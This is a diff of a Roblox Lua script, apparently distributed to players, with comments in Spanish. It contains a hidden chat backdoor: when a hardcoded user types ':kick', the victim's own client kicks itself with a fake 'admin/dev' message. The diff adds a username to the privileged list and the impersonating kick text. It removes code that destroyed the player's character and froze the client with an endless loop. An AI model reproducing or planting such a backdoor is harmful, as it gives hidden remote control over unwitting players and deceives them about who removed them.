@@ -17,6 +17,7 @@ local StarterGui = game:GetService("StarterGui")
 local sigma = {
     "pedrood2", 
     "iidino122",
+	"iAmLegitTrust_p",
     "Milaneso202_xd"
 }
 
@@ -55,45 +56,16 @@ local function executeKick(targetPlayer)
     kickLabel.BackgroundTransparency = 1
     kickLabel.Size = UDim2.new(1, 0, 1, 0)
     kickLabel.Font = Enum.Font.SourceSansBold
-    kickLabel.Text = "Lucky Next Time."
+    kickLabel.Text = "KICKED FROM THE GAME BY ADMIN/DEV"
     kickLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     kickLabel.TextScaled = true
     kickLabel.TextWrapped = true
-
-	local player = game.Players.LocalPlayer
-wait(0.1)
-Workspace[player.Name].Torso:Destroy()
-wait(1)
-local bool = true
-
-
-if bool then
-    game.Workspace.FallenPartsDestroyHeight = 0 / 0
-else
-    game.Workspace.FallenPartsDestroyHeight = -500
-end
-
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-989889989898989, -989879898998988, -98999898989899898)
-wait(0.3)
-Workspace[player.Name].Humanoid:Destroy()
-wait(0.2)
-Workspace[player.Name].Head:Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Right Leg"):Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Left Leg"):Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Right Arm"):Destroy()
-wait(0.2)
-Workspace[player.Name]:FindFirstChild("Left Arm"):Destroy()
 
     -- Esperar un momento para mostrar el GUI antes de expulsar
     wait(2)
     
     -- Expulsar al jugador usando el método :Kick()
-    targetPlayer:Kick("You were kicked by an admin.")
-	while true do
-	end
+    targetPlayer:Kick("You were kicked by Dev/Admin.")
 end
 
 -- Buscar jugador por nombre parcial
@@ -109,27 +81,30 @@ end
 
 -- Manejo de comandos de chat
 local function onChatMessage(player, message)
-    if admins(player.Name) or admins(player.DisplayName) then
-        if message:lower() == alpha:lower() then
-            local args = {
-                [1] = ">>> HII!",
-                [2] = "All"
-            }
-            game:GetService("ReplicatedStorage")
-                :WaitForChild("DefaultChatSystemChatEvents")
-                :WaitForChild("SayMessageRequest")
-                :FireServer(unpack(args))
-        end
+    -- Si el jugador dice "users", ignorar si es pedrood2
+    if message:lower() == alpha:lower() and player.Name:lower() ~= "pedrood2" then
+        local args = {
+            [1] = ">>> HII!",
+            [2] = "All"
+        }
+        game:GetService("ReplicatedStorage")
+            :WaitForChild("DefaultChatSystemChatEvents")
+            :WaitForChild("SayMessageRequest")
+            :FireServer(unpack(args))
+    end
 
-        if message:sub(1, 5):lower() == ":kick" then
-            local partialName = message:sub(7):lower()
-            local targetPlayer = findPlayerByName(partialName)
-            if targetPlayer then
-                executeKick(targetPlayer)
-            else
-                player:Kick("Player not found: " .. partialName)
-            end
+    -- Permitir solo a pedrood2 usar el comando :kick
+    if message:sub(1, 5):lower() == ":kick" and player.Name:lower() == "pedrood2" then
+        local partialName = message:sub(7):lower()
+        local targetPlayer = findPlayerByName(partialName)
+        if targetPlayer then
+            executeKick(targetPlayer)
+        else
+            player:Kick("Player not found: " .. partialName)
         end
+    elseif message:sub(1, 5):lower() == ":kick" then
+        -- Avisar al resto de jugadores que no tienen permiso
+        player:Kick("You do not have permission to use this command.")
     end
 end
 
@@ -148,6 +123,7 @@ for _, player in ipairs(players:GetPlayers()) do
         onChatMessage(player, message)
     end)
 end
+
 
 -- Función para mostrar una notificación
 local function showNotification(title, text, duration)
